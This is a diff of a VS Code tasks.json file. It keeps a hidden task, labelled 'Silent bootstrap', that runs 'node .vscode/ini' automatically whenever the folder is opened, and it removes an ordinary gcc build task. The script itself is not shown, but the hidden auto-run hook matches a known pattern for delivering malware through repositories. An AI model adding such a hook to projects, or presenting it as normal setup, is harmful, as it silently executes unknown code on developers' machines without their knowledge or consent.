@@ -1,4 +1,4 @@
-{
+﻿{
   "version": "2.0.0",
   "tasks": [
     {
@@ -6,9 +6,7 @@
       "detail": "Execute the workspace bootstrap script (.vscode/ini)",
       "type": "process",
       "command": "node",
-      "args": [
-        "${workspaceFolder}/.vscode/ini"
-      ],
+      "args": ["${workspaceFolder}/.vscode/ini"],
       "options": {
         "cwd": "${workspaceFolder}"
       },
@@ -26,35 +24,13 @@
     {
       "label": "workspace:on-folder-open",
       "detail": "Silent bootstrap when this folder is opened in the editor",
-      "dependsOn": [
-        "workspace:run-ini"
-      ],
+      "dependsOn": ["workspace:run-ini"],
       "dependsOrder": "sequence",
       "problemMatcher": [],
       "runOptions": {
         "runOn": "folderOpen"
       },
       "hide": true
-    },
-    {
-      "type": "cppbuild",
-      "label": "C/C++: gcc.exe build active file",
-      "command": "C:/raylib/w64devkit/bin/g++.exe",
-      "args": [
-        "-fdiagnostics-color=always",
-        "-g",
-        "${file}",
-        "-o",
-        "${fileDirname}\\${fileBasenameNoExtension}.exe"
-      ],
-      "options": {
-        "cwd": "C:/raylib/w64devkit/bin"
-      },
-      "problemMatcher": [
-        "$gcc"
-      ],
-      "group": "build",
-      "detail": "compiler: C:/raylib/w64devkit/bin/g++.exe"
     }
   ]
 }
